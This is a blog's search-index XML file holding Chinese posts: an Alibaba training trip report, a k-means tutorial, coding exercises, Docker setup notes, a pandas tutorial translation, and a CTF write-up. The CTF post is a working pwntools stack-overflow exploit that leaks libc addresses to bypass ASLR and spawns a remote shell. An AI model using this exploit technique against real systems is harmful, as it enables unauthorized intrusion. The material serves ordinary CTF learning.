<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[记2017年阿里巴巴之行]]></title>
      <url>%2F2027%2F02%2F17%2F%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C%2F</url>
      <content type="text"><![CDATA[&emsp;&emsp;今年1月份，接到一个任务，负责组建厦门大学的互联网安全志愿者联盟队伍，我暂居队长之位。从大体上来讲，该志愿联盟偏向于业务性，而非技术性，这与我之前所接触的网络安全方向有所不同。而在今年2月15日，作为队长，受联盟邀请前往阿里巴巴参与青年领导力培训会。以下就“记流水账”地回忆一下这几天来的经历吧。 前奏&emsp;&emsp;在前往阿里巴巴之前，我被任命为HR，负责管理此次参加阿里巴巴培训会的各高校同学的信息和安全。虽然被选为组委会的同学们（大部分）都还互不相识，但在工作时配合度和效率还是非常高的。而且也很感谢慈玉姐的信任，不然以我互联网安全联盟资历之浅何以担此之任？ 2 月 15 日 晚&emsp;&emsp;我选择火车，从厦门北出发，一路颠簸。由于作为HR，需要及时的跟进各位人员的行程信息，但手机信号时好时坏，所以在沟通上也时断时续hh。&emsp;&emsp;等到了杭州，已经是下午的五点左右。三年前，曾和两知己来杭州浙大进行物竞培训，而今三人中一人去了北大一人去了浙大，不禁感慨。 &emsp;&emsp;尽管早早地坐上出租车，不过在16公里的路程中遇到了16个红灯，等到达酒店已是六点多，等收拾完毕，欧总PM招呼我和他们吃饭。在吃饭的过程中和其他联盟队伍的同学进行交谈，向欧总PM，赵zy学长，马l学姐等讨教一些关于建队和发展的事项。 &emsp;&emsp;晚上8点左右，慈玉姐给各位参会同学开个简短的小会，并在之后与组委会成员讨论进一步的后续安排。并且单独与慈玉姐探讨了本校联盟的发展方向和具体事项，并且我向慈玉姐询问了关于阿里巴巴校园俱乐部的事。俱乐部的事跟安全联盟没有关系，不过慈玉姐要帮我向其余部门的同事询问询问，太感谢了！ 2 月 16 日上午：阿里企业文化&emsp;&emsp;上午的主要内容是介绍阿里巴巴的企业文化。印象较为深刻的，首先是阿里的绩效考核机制，将个人价值观纳入绩效考核体系，最终的评价约莫有五种：明星，老黄牛，野狗，小白兔，狗。一方面在为这种考核机制感到惊讶，另一方面在想评价中没有“猫”是不是因为阿里在业内被称作“猫厂”hh。 &emsp;&emsp;再者是，阿里员工的培训与成长体系。平日有稍关注各大IT公司的层级分布，知道阿里的p层（技术岗）和m层（管理岗），但大多数时候有种割裂的感觉。而此次会上的所提到的，恰好成为链接各大层级的链环，从p6到p9+，从m1到m4+，这是个渐进的过程，同时需要职业技能的增长，也需要通用技能的提升，这属于阿里对关键人才的发展项目。同时阿里有为员工提供夜校，这是个成长的过程。 &emsp;&emsp;还有是，阿里员工的福利。阿里的食堂自不必说，讲一些特殊的。比如在阿里有所谓的”一年香，三年醇，五年陈”，阿里的员工每到一个阶段，都能获得相应的奖励，比如“五年陈”时候会被授予一枚戒指。这点有点类似暴雪公司的奖励机制，暴雪的员工在各个相应工作年限也能获得奖励，比如五年时会获得荣耀之剑。一方面是对员工过去几年奋斗的肯定，另一方面，我相信阿里和暴雪的员工都是激情的人，这种年长的奖励有点像打怪升级一样，这点对员工的归属感、成就感以及凝聚力的形成是很重要的。 &emsp;&emsp;当然还有一些阿里的小细节，这里稍微讲讲阿里对离职员工的做法。阿里有所谓的“校友日”，离职的员工能在规定的时间回来阿里。阿里能再对离职员工敞开大门，这是一种关怀；而离职员工愿意再踏进爱大门，这是一种情怀。毕竟很多企业很多公司的员工在离职后基本上就是与原公司一刀两断了。我想这种关怀和情怀是需要基于双方的，同时也是植根于企业文化的。 &emsp;&emsp;总体来说，管中窥豹可见一斑吧。 下午：安全联盟案例及其经验分享&emsp;&emsp;下午的内容，主要是来自联盟的博雷来分享一下关于互联网安全联盟的案例。涉及具体工作内容的这里不方便展开。但记得她说过的一句话：要干轰轰烈烈的事。有共鸣，有感触。有些时候的豪言壮语会显得假大空，不过对我自己而言，关于“要做轰轰烈烈的事”的想法却是没停过，不可否认有过各种失败，不过人要有梦想嘛，万一实现了呢。其实就我个人而言，身处于jsj系，但深感此系资源不足，挺（很）想在系里建立各种it公司互联网公司的各种学生俱乐部，像阿里学生俱乐部、微软学生俱乐部等等，虽然称不上轰轰烈烈，但至少也算是个想法，但愿日后能实现吧！在下午结束时，慈玉姐也分享了自己的传奇经历，吾等膜拜ing。 晚上：难得的技术交流&emsp;&emsp;晚上是晚宴。在每次做游戏中，我成功地输了n次罚了n杯酒hh。值得一提的是由于我偏向技术层面，慈玉姐这几天一直想让我与联盟的一些技术人员能有更多的交流，太感谢了！当天的晚宴上，（我觉得hh）慈玉姐特地把联盟的偏技术方向的霍金大哥安排在我座旁。霍金大哥原本就职于腾讯，后来阿里。在技术方面能有更多的共同话题，所以和霍金大哥一路从CTF聊到阿里云安全，从本科教育聊到职业规划，我从霍金大哥那里获得了许多的建议。 2 月 17 日&emsp;&emsp;这算是行程的最后一天，偏向于精神方向（或者说 虚hh）。早上由教官带领做做团体游戏，下午则游玩西溪湿地，略过不提，这里放张西溪湿地公园的照片。 &emsp;&emsp;等游完公园回到阿里巴巴总部，就是最终的小组pk。两天的小竞争中与另一组并列第一，但在最后的加赛中输啦。而许多高校同学在结束后离开，剩余一些同学则可以继续参与晚上的KTV活动，然后明天就各回各家啦。 小结&emsp;&emsp;总体上，此次阿里之旅，干货满满。硬技术能力固然重要，不过软能力软技能也重要，码农圈中有句话：“Talk is cheap，show me the code。”我觉得，如果单会show的话是无法把你的代码说清楚的，这还需要你的交际语言表达能力，这是软技能之一。此次前来，和联盟中人大多数的交谈是基于业务性的，是一种完全学习的态度，当然若是基于技术类的交谈，则会更像是交流。不过这是少数情况hh。同时此行中，认识了非常多的同学，在两天的小组pk中领略了他们的过人之处。 &emsp;&emsp;还有就是骗了好多赞哈哈 &emsp;&emsp;以此流水账记此次阿里之行]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[机器学习算法：k-means]]></title>
      <url>%2F2017%2F03%2F08%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9Ak-means%2F</url>
      <content type="text"><![CDATA[条件待分类的特征矢量集为 {x_1,x_2,x_3,……x_N}类别的数目已知：c 基本想法取定 k 个类别，选取 k 个初始聚类中心，按最小距离原则将各模式分配到 k类 中的某一类，之后不断的计算类心和调整各模式的类别，最终使得各模式到其判属类别的距离平方之和最小。 算法步骤 选择k个模式特征矢量作为初始聚类中心：{$ z{_1}{^{(0)}},z{_2}{^{(0)}}, z{_3}{^{(0)}} ,…… ,z{_k}{^{(0)}}$}。令 q = 0。 将待分类的模式特征矢量集{x_i}中的模式逐个按最小距离原则分划给 k类中的某一类，即：如果 d_{il}^{(q)} = {\mathop{min}\limits_{ij}}[d_{ij}^{(q)}]则判定 x_i ∈ ω_l^{q+l}式中，d_{il}^{(q)}表示 x_i 和 ω_j^{q}的中心 z_j^{(j)}。上角标为迭代次数，于是产生了新的聚类 ω_j^{(q+1)} (j=1,2,3,……,k) 计算重新分类后的各类心z_j^{q+1} =\frac{1}{n_j^{q+1}}\sum_{x_i ∈ \omega_j^{q+1}} x_i\tag{j = 1,2,3,……,k} 式中：$n_j^{k+1}$ 为 $\omega_j^(k+1)$ 类中所含模式的个数 如果 $ z_j^{q+1}=z_j^{q} $ ，则结束，否则返回（2） 算法实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788import numpy as npimport pandas as pdimport copy as cpdef readData(filepath): file = pd.read_table(filepath,header=None,sep=' ') return file# 计算欧几里得距离def distance(vec1,vec2): return np.sqrt(sum(np.power((vec1-vec2).tolist(),2)))# 计算特征X与各质心的距离，按最小距离原则找到点X对应的类,此处距离为欧式距离def findClass(dataSetloc,centerSet): disitoZ = [] for j in range(len(centerSet)): disitoZ.append(float(distance(dataSetloc,centerSet[j]))) print(disitoZ) return(disitoZ.index(min(disitoZ)))# 用于计算调整后各类的中心def adjustCenter(centerSet,classNumber): tempCenter=[] for i in range(classNumber): tempCenter.append([0,0,0]) for i in range(classNumber): patternNum = len(centerSet[i]) # 计算新的质心 for nowX in centerSet[i]: tempCenter[i][0] += nowX[0] tempCenter[i][1] += nowX[1] tempCenter[i][2] += nowX[2] for j in range(3): tempCenter[i][j] = tempCenter[i][j] / patternNum return tempCenterdef isequal(class1,class2): return (class1[0]==class2[0] and class1[1]==class2[1])pdDataSet = readData('dataset.txt')# 题目所给初始条件sk = int(input("输入类别数目:\n"))center = []classSet = []classLabel = []for i in range(k): print("请输入第",i+1,"个初始中心：") templist = list(input().split(',')) templist = [float(num) for num in templist] center.append(templist) classSet.append([]) classLabel.append([])print('初始中心如下：')print(center)# 用于判断结束条件judgeValue = 1# 用于记录迭代次数global iterationsiterations = 0while judgeValue : # centerCopy保存center的初始值，用于结束判断 print("----------------------------------------") iterations += 1 classLabelCopy = cp.deepcopy(classLabel) print("第",iterations,"次循环") classSet = [[],[],[]] classLabel = [[],[],[]] print("--------计算每个点到各类中心的距离--------") for i in range(len(pdDataSet)): Xindex = findClass(pdDataSet.loc[i],center) classSet[Xindex].append(pdDataSet.loc[i].tolist()) classLabel[Xindex].append(i) print("----------当前各类中心位置----------") center = adjustCenter(classSet,k) for i in range(k): print("第",i+1,"类中心位置为",center[i]) print("----------当前分类结果(数据)----------") print(classSet) print("----------当前分类结果（对应索引）----------") print(classLabel) # 若类别中的点不再变化，则退出循环 if isequal(classLabel,classLabelCopy): judgeValue = 0 dataset.txt内容：1234567891011121314151617181920-7.82 -4.58 -3.97-6.68 3.16 2.714.36 -2.19 2.096.72 0.88 2.80-8.64 3.06 3.50-6.87 0.57 -5.454.47 -2.62 5.766.73 -2.01 4.18-7.71 2.34 -6.33-6.91 -0.49 -5.686.18 2.81 5.826.72 -0.93 -4.04-6.25 -0.26 0.56-6.94 -1.22 1.138.09 0.20 2.256.81 0.17 -4.15-5.19 4.24 4.04-6.38 -1.74 1.434.08 1.30 5.36.27 0.93 -2.78 （话说：latax写公式的感觉好爽啊……）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(3)数组单调和]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-3-%E6%95%B0%E7%BB%84%E5%8D%95%E8%B0%83%E5%92%8C%2F</url>
      <content type="text"><![CDATA[题目现定义数组单调和为所有元素i的f(i)值之和。这里的f(i)函数定义为元素i左边(不包括其自身)小于等于它的数字之和。请设计一个高效算法，计算数组的单调和。给定一个数组A同时给定数组的大小n，请返回数组的单调和。保证数组大小小于等于500，同时保证单调和不会超过int范围。 测试样例：[1,3,5,2,4,6],6返回：27 解法12345678910111213class MonoSum &#123;public: int calcMonoSum(vector&lt;int&gt; A, int n) &#123; int sum = 0; int i,j; for (j = 1;j &lt; n;j++)&#123; for (i = 0;i &lt; j;i++)&#123; sum += A[i]&lt;=A[j]?A[i]:0; &#125; &#125; return sum; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(2)棋子翻转]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-2-%E6%A3%8B%E5%AD%90%E7%BF%BB%E8%BD%AC%2F</url>
      <content type="text"><![CDATA[题目在4x4的棋盘上摆满了黑白棋子，黑白两色的位置和数目随机其中左上角坐标为(1,1),右下角坐标为(4,4),现在依次有一些翻转操作，要对一些给定支点坐标为中心的上下左右四个棋子的颜色进行翻转，请计算出翻转后的棋盘颜色。给定两个数组A和f,分别为初始棋盘和翻转位置。其中翻转位置共有3个。请返回翻转后的棋盘。 测试样例：[[0,0,1,1],[1,0,1,0],[0,1,1,0],[0,0,1,0]],[[2,2],[3,3],[4,4]]返回：[[0,1,1,1],[0,0,1,0],[0,1,1,0],[0,0,1,0]] 解法123456789101112131415161718192021222324class Flip &#123;public: vector&lt;vector&lt;int&gt; &gt; flipChess(vector&lt;vector&lt;int&gt; &gt; A, vector&lt;vector&lt;int&gt; &gt; f) &#123; int numOfRotate = 3; int temp; int i,j; for (temp = 0;temp &lt; numOfRotate;temp++)&#123; int x = f[temp][0] - 1; int y = f[temp][1] - 1; if ((y - 1) &gt;= 0) A[x][y - 1]++; if ((y + 1) &lt;= 3) A[x][y + 1]++; if ((x - 1) &gt;= 0) A[x - 1][y]++; if ((x + 1) &lt;= 3) A[x+1][y]++; &#125; for (i = 0;i &lt; 4;i++) for (j = 0;j &lt; 4;j++) A[i][j] = A[i][j]%2; return A; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(1)最大差值]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-1-%E6%9C%80%E5%A4%A7%E5%B7%AE%E5%80%BC%2F</url>
      <content type="text"><![CDATA[题目有一个长为n的数组A，求满足0≤a≤b&lt;n的A[b]-A[a]的最大值。给定数组A及它的大小n，请返回最大差值。 测试样例：[10,5],2返回：0 法一1234567891011121314class LongestDistance &#123;public: int getDis(vector&lt;int&gt; A, int n) &#123; int min = A[0]; int dis = 0; int i,j; for (i = 0; i &lt; n ; i++) for (j = i+1 ; j &lt; n ; j++)&#123; if (A[j] - A[i] &gt; dis) dis = A[j] - A[i]; &#125; return dis; &#125;&#125;; 法二1234567891011121314class LongestDistance &#123;public: int getDis(vector&lt;int&gt; A, int n) &#123; int min = A[0]; int dis = 0; int i; for (i = 0; i &lt; n ; i++)&#123; if (A[i] &lt; min) min = A[i]; if ((A[i] - min) &gt; dis) dis = A[i]-min; &#125; return dis; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[栈溢出学习之bypass ASLR:利用DynELF模块leak出内存地址]]></title>
      <url>%2F2017%2F02%2F16%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E4%B9%8Bbypass-ASLR-%E5%88%A9%E7%94%A8DynELF%E6%A8%A1%E5%9D%97leak%E5%87%BA%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%2F</url>
      <content type="text"><![CDATA[exploit:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *#p = remote('pwn2.jarvisoj.com', 9880)p = remote('218.2.197.235',20433)elf = ELF('./xmanlevel4')writeplt = elf.symbols['write']readplt = elf.symbols['read']vulnaddr = 0x804844bbssaddr = elf.bss(0x200)pppraddr = 0x8048509staraddr = 0x8048350def leak(address): payload = 'a'*140 payload += p32(writeplt) payload += p32(vulnaddr) payload += p32(1) payload += p32(address) payload += p32(4) p.send(payload) data = p.recv(4) print "%#x =&gt; %s " % (address,(data or '').encode('hex')) return datadynelf = DynELF(leak,elf=ELF('./xmanlevel4'))sysaddr = dynelf.lookup('system','libc')print "system address is " + hex(sysaddr)print "-----------------------------------"payload1 = 'a' * 140payload1 += p32(readplt)payload1 += p32(pppraddr)payload1 += p32(0)payload1 += p32(bssaddr)payload1 += p32(8)payload1 += p32(sysaddr)payload1 += p32(1)payload1 += p32(bssaddr)p.send(payload1)p.send('/bin/sh\0')p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[win下Docker默认存储位置修改]]></title>
      <url>%2F2017%2F02%2F14%2Fwin%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9%2F</url>
      <content type="text"><![CDATA[在如前安装完docker后，会有如下界面：之后我们会通过一系列的命令来建造容器，而所需要的镜像则会被默认存放在C盘中的 虚拟机磁盘文件disk.vmdk中，所以为防止以后镜像过多而导致的C盘空间不足，要想办法修改一下存储的位置。 第一步先停掉 docker-machine,命令行中输入 docker-machine stop default 第二步在virturalbox界面同时按下 ctrl+D 调出虚拟介质管理器。 红箭头所指即为docker-machine的虚拟磁盘文件地址。点击右上角的复制，根据提示操作，为保持一致性，在选择磁盘时选择 vmdk磁盘，并选择你要作为磁盘存放路径的目录。这里我将其复制到了 D:\virtualboxVM\docker-machine\disk.vmdk 第三步返回virtualbox界面，按下 ctrl+s 跳出关于虚拟机 default 的设置界面。先移除掉原本的 disk.vmdk 再点选控制器，选择出现的两个按钮中的右边那个：添加虚拟硬盘选择“使用现有的虚拟盘”，将第二步中复制出来的硬盘文件导入。添加完成后，如下，可以发现disk的路径已经改变。 第四步重启docker，命令行中输入： docker-machine start default 即可]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[windows平台下Docker环境搭建]]></title>
      <url>%2F2017%2F02%2F13%2Fwindows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
      <content type="text"><![CDATA[由于准备自己写个虚拟机，以及日后ctf题环境的搭建等，准备开始接触docker。相比于vmware等虚拟机软件，docker能很好的做出一个隔离linux的环境，并且它能直接调用物理机硬件，而不像vmware是自己虚拟化硬件，这样在docker容器里跑cuda调用本机的显卡就有可能了。下面记录一下自己的docker搭建过程。 下载win下我们一般直接选择 Docker Toolbox 法一docker的官网：下载地址但官网下载会很慢，甚至下载了好久突然间失败hh 法二镜像站：下载地址速度快，但版本的更新问题啥的自己注意。 安装下载的exe打开，一路跟着提示走。 可以自己选择安装位置,但要记住。后面要用到。这里为 D:\Docker Toolbox 注意需要安装virtualbox，因为我们是在win平台下安装docker，而docker是高度依赖linux的，所以这里需要virtualbox（开源免费）来提供win平台下linux内核的接口与特性 需要安装git for windows，若原本机子中已经有了，可以勾掉不选择。 kitematic是docker的GUI工具，也顺便安了吧。不过一般咱都是用命令行的嘛。 耐心等待安装过程结束 初次启动安装完成后，桌面上会多出三个图标 Oracle VM VirtualBox Kitematic (Alpha) Docker Quickstart Terminal 这里我们只需要先打开（双击）第三个。第一次运行时，黑屏幕上只有光标，可能需要先打一个回车。一般情况下如下： 可能等很久都没有反应，我说的是 “可能”hh注意到里面的意思是要把 boot2docker 下载下来，记住下载路径： C:\Users\ASUS\.docker\machine\cache 打开dokcer的安装路径（以我的安装路径为例）D:\Docker Toolbox将里面的 boot2docker.iso 拷贝到 下载路径里 回到桌面运行 Docker Quickstart Terminal，可能需要再按一次回车 等“安装”完成，控制台会出现： 完成后最好重启一下这样就行啦。 可能的问题初始化问题解决方法：将 virtualbox 和 docker 卸载掉，重启，再重新安装 Terminal一直自动关闭解决方法：重启电脑……]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（5）ten Minutes to pandas中文版下]]></title>
      <url>%2F2017%2F02%2F02%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B%2F</url>
      <content type="text"><![CDATA[此文是 ten-Minutes-to-pandas 下半部分的翻译。上半部分请看：《数据挖掘比赛（4）ten Minutes to pandas中文版上》紧接上文的数据，如下：以下下半部分正文开始： 操作（Operations）更多内容请看：《Basic section on Binary Ops》 统计（Stats）通常情况下，这些操作的对象不包括缺失值 描述性统计信息1df.mean() 指定轴向在其他轴上执行相同操作1df.mean(1) 自动对应维度对具有不同维度和需要对齐的对象操作时，pandas会自动地沿着特定的维度进行广播（注：其实就是运算啦）123# 准备工作s = pd.Series([1,3,5,np.nan,6,8], index=dates).shift(2)s （注：.shift操作会对数据进行移动，空出的位置用nan代替） 1df.sub(s, axis='index') （注： .sub 表示 减去 ） 函数应用（Apply）把函数应用到数据上 使用已有函数1df.apply(np.cumsum) （注：np.cumsum的使用方法） 使用匿名函数1df.apply(lambda x: x.max() - x.min()) （注：lambda表达式，建议百度） 直方图（Histogramming）更多内容请查阅 《Histogramming and Discretization》123# 准备工作s = pd.Series(np.random.randint(0, 7, size=10))s 1s.value_counts() （注：Histogramming翻译过来是叫直方图。这里value_counts返回的数据中说明了 5 出现了 3 次， 2 出现了 2 次等等，虽无图形，但实际上却是是直方图的表示） 字符串方法（String Methods）Series对象的 str属性 中集成了一系列用于处理字符串的方法，如下代码所示，能够很方便对对象中的每个元素进行处理。注意到，通常情况下在 str属性中的 模式匹配（pattern-matching）默认使用了 正则表达式（regular expressions）。更多内容请查阅 《Vectorized String Methods》 123# 准备工作s = pd.Series(['A', 'B', 'C', 'Aaba', 'Baca', np.nan, 'CABA', 'dog', 'cat'])s 12# .loewr() 转换成小写字母s.str.lower() 数据合并（Merge）就合并类操作（join / merge-type operations）而言，pandas提供了各种工具能方便地对Series，DataFrame，和 Panel对象 进行各种逻辑演算来进行数据合并 。更多内容请查阅《Merging section》（注：上面这段话在原文中放在concat的开头，为逻辑和结构上的完整和流畅，我这里放到了这边） Concat用 concat() 把pandas对象联系（Concatenating）起来123# 准备工作df = pd.DataFrame(np.random.randn(10, 4))df 123# 准备工作2：把刚刚生成的df分片（break it into pieces）pieces = [df[:3], df[3:7], df[7:]]pieces 12# 使用concat()连接pd.concat(pieces) JoinSQL形式的连接。更多内容请查阅《Database style joining》 示例一123# 准备工作1left = pd.DataFrame(&#123;'key': ['foo', 'foo'], 'lval': [1, 2]&#125;)left 123# 准备工作2right = pd.DataFrame(&#123;'key': ['foo', 'foo'], 'rval': [4, 5]&#125;)right 12# 使用 merge() 连接pd.merge(left, right, on='key') 示例二另一个例子如下：123# 准备工作1left = pd.DataFrame(&#123;'key': ['foo', 'bar'], 'lval': [1, 2]&#125;)left 123# 准备工作2right = pd.DataFrame(&#123;'key': ['foo', 'bar'], 'rval': [4, 5]&#125;)right 1pd.merge(left, right, on='key') Append向 dataframe对象添加行。更多内容请查阅 《Appending》 123# 准备工作1df = pd.DataFrame(np.random.randn(8, 4), columns=['A','B','C','D'])df 123# 准备工作2s = df.iloc[3]s 12# 使用 appenddf.append(s, ignore_index=True) 分组（Grouping）对分组操作，我们指的是包含以一个或多个步骤的过程： 根据某些标准把数据切分（Splitting）成不同组别 给每个组别独立地应用（Applying）函数 将结果组合（Combining）成同一数据结构 更多内容请查看 《Grouping section》 12345678# 准备工作df = pd.DataFrame(&#123;'A' : ['foo', 'bar', 'foo', 'bar', ....: 'foo', 'bar', 'foo', 'foo'], ....: 'B' : ['one', 'one', 'two', 'three', ....: 'two', 'two', 'one', 'three'], ....: 'C' : np.random.randn(8), ....: 'D' : np.random.randn(8)&#125;)df 一列分组，然后对各个分组结果应用函数（sum）1df.groupby('A').sum() 多列根据多列分组，形成层次索引，从而可以对其使用函数。1df.groupby(['A','B']).sum() 数据重组（Reshaping）更多内容请查看 《Hierarchical Indexing》 和 《Reshaping》 Stack123456789# 准备工作tuples = list(zip(*[['bar', 'bar', 'baz', 'baz', ....: 'foo', 'foo', 'qux', 'qux'], ....: ['one', 'two', 'one', 'two', ....: 'one', 'two', 'one', 'two']]))index = pd.MultiIndex.from_tuples(tuples, names=['first', 'second'])df = pd.DataFrame(np.random.randn(8, 2), index=index, columns=['A', 'B'])df2 = df[:4]df2 12stacked = df2.stack()stacked 对于一个 “stacked” 的 DataFrame 或者 Series 对象 （它们的索引是层次索引），stack（）操作的逆操作是 unstack（），它默认情况下只处理末级层次的索引。 1stacked.unstack() 1stacked.unstack(1) 1stacked.unstack(0) 数据透视表（Pivot Tables）更多内容请查阅 Pivot Tables 1234567# 准备工作df = pd.DataFrame(&#123;'A' : ['one', 'one', 'two', 'three'] * 3, .....: 'B' : ['A', 'B', 'C'] * 4, .....: 'C' : ['foo', 'foo', 'foo', 'bar', 'bar', 'bar'] * 2, .....: 'D' : np.random.randn(12), .....: 'E' : np.random.randn(12)&#125;)df 我们可以很简便地从数据中得到数据透视表1pd.pivot_table(df, values='D', index=['A', 'B'], columns=['C']) 时间序列（Time Series）在频率转换重采样时，pandas具有简单强大有效的作用（比如说，把秒级采样的数据转换成 5分钟级别的数据）。这在金融领域非常常见，当然也不仅局限于此。更多内容请查阅 《Time Series section》 时分秒1234# 准备工作rng = pd.date_range('1/1/2012', periods=100, freq='S')ts = pd.Series(np.random.randint(0, 500, len(rng)), index=rng)ts （注：上图只截取了一部分的数据） 12# 转换ts.resample('5Min').sum() 时区时区表示1234# 准备工作rng = pd.date_range('3/6/2012 00:00', periods=5, freq='D')ts = pd.Series(np.random.randn(len(rng)), rng)ts 12ts_utc = ts.tz_localize('UTC')ts_utc 时区转换1ts_utc.tz_convert('US/Eastern') 时期转换（period）123rng = pd.date_range('1/1/2012', periods=5, freq='M')ts = pd.Series(np.random.randn(len(rng)), index=rng)ts 12ps = ts.to_period()ps 时间戳转换（timestamp）1ps.to_timestamp() 函数应用在 时期（period）和时间戳（timestamp）转换时有一些方便的算术函数可以使用。在下面的例子中，我们把以季度为频率的数据转换成以季度末月为频率的数据。123prng = pd.period_range('1990Q1', '2000Q4', freq='Q-NOV')ts = pd.Series(np.random.randn(len(prng)), prng)ts 12ts.index = (prng.asfreq('M', 'e') + 1).asfreq('H', 's') + 9ts.head() 分类型数据（categorical）从 0.15版本开始，pandas的dataframe对象开始支持分类性数据（categorical data）。更多内容请查阅 《categorical introduction》 和 《API documentation》12df = pd.DataFrame(&#123;"id":[1,2,3,4,5,6], "raw_grade":['a', 'b', 'b', 'a', 'a', 'e']&#125;)df 转换将原始grade数据转换成分类型数据12df["grade"] = df["raw_grade"].astype("category")df["grade"] 重命名给分类型数据重命名为更有意义的名字。（通过 Series.cat.categories 来指派位置）12df["grade"].cat.categories = ["very good", "good", "very bad"]df 数据修整给分类型数据重排序，同时填补缺失值。（默认情况下， Series.cat 方法会返回一个新的Series类型 ）12df["grade"] = df["grade"].cat.set_categories(["very bad", "bad", "medium", "good", "very good"])df["grade"] 排序问题给分类型排序是按照 categories 的顺序，而不是按照字典顺序1df.sort_values(by="grade") 归类按照分类列来数据归类时，空的类别也会显示出来。1df.groupby("grade").size() 作图（Plotting）更多内容请看《Plotting》 基本画图1234# 数据ts = pd.Series(np.random.randn(1000), index=pd.date_range('1/1/2000', periods=1000))ts = ts.cumsum()ts 12# 作图ts.plot() dataframe作图在dataframe对象里，plot（）可以很方便地画出所有有标签的列。1234df = pd.DataFrame(np.random.randn(1000, 4), index=ts.index, .....: columns=['A', 'B', 'C', 'D'])df = df.cumsum()plt.figure(); df.plot(); plt.legend(loc='best') 数据读写（Getting Data In/Out）CSV写入把数据写进 CSV文件。更多内容请查阅 《Writing to a csv file》1df.to_csv('foo.csv') 读出将数据从 csv文件 中读出。更多内容请查阅 《Reading from a csv file》1pd.read_csv('foo.csv') HDF5更多内容请看 《HDFStores》 写入1df.to_hdf('foo.h5','df') 读出1pd.read_hdf('foo.h5','df') Excel更多内容请看 《MS Excel》 写入1df.to_excel('foo.xlsx', sheet_name='Sheet1') 读出1pd.read_excel('foo.xlsx', 'Sheet1', index_col=None, na_values=['NA']) 陷阱（Gotchas）如果你试着做这样的操作，你会得到如下信息。 更多信心请查看 《Comparisons》 和 《Gotchas》]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（4）ten Minutes to pandas中文版上]]></title>
      <url>%2F2017%2F02%2F01%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A%2F</url>
      <content type="text"><![CDATA[pandas官方文档中有一份快速入门教程《ten Minutes to pandas》，虽然网上早有其中文翻译，不过可能是旧版的：）所以闲来无事，自己也翻译最新版本的学习一下。 这里示例部分都由代码和运行结果图片组成，读者可以直接复制代码来运行；同时为了更清晰，加入了一些小结构标题，所以在小细节处跟官方文档略有不同。本机的运行环境是Python 3.5.2 |Anaconda 4.2.0 (64-bit) ，pandas库的版本为0.19.2，使用jupyter noterbook作为交互环境，对照的这份文档版本为 0.19.2 。这篇文章是对 ten-Minutes-to-pandas的上半部分的翻译。以下正文开始： 总说这是一份主要面向新手的对pandas库的简要介绍。想了解更多，你可以通过阅读Cookbook通常，我们像下面这样导入：123import pandas as pdimport numpy as npimport matplotlib.pylot as plt 创建对象（Object Creadtion）可以通过查看Data Structure Intro section来获取关于这节的更多内容 创建Series我们可以通过传递列表（list）来创建 Series，pandas会自动为其生成默认整数索引。12s = pd.Series([1,3,5,np.nan,6,8])s 创建DataFrame传递数组我们可通过传递数组对象（numpy array），时间索引（datetime index）、列标签（labeled columns）来创建 DataFrame12dates = pd.date_range('20130101',periods=6)dates 12df = pd.DataFrame(np.random.randn(6,4),index=dates,columns=list('ABCD'))df 传递字典我们可以通过传递一个能被转换成类似序列（Serise-like）的字典对象（dict）来创建 DataFrame 1234567df2 = pd.DataFrame(&#123; 'A' : 1.,....: 'B' : pd.Timestamp('20130102'),....: 'C' : pd.Series(1,index=list(range(4)),dtype='float32'),....: 'D' : np.array([3] * 4,dtype='int32'),....: 'E' : pd.Categorical(["test","train","test","train"]),....: 'F' : 'foo' &#125;)df2 它们的列有不同的数据类型1df2.dtypes IPython如果你使用 IPython ，那么tab键能自动补全 列名（column names）和 属性（ public attributes）。下面是能被自动补全的属性的一个子集：1df2. （注：如上图红箭头处按 tab键 ） 你可以看到，列名 A 等会被自动补齐……（原文：As you can see, the columns A, B, C, and D are automatically tab completed. E is there as well; the rest of the attributes have been truncated for brevity。 因为没有做和原文相似的图，所以这句只好：）不翻译了hh ） 查看数据（Viewing Data）查看 Basics section 获得关于这节的更多内容。 查看frame中的头部和尾部部分的行1df.head() 1df.tail() 显示索引、列名、底层numpy数据（the underlying numpy data）1df.index 1df.columns 1df.values （注：这个values，应该就是把df中的数据直接以numpy array的形式打印出来，注意与前面的 df 命令图片对比一下） 对数据进行快速简单统计1df.describe() (注：count：计数，多少个hh；mean：平均数；std：方差；min：最小值；25%：分位数； 50%：分位数，中位数；75%：分位数；max：最大值) 转置（Transposing）1df.T 排序按轴排序（Sorting by an 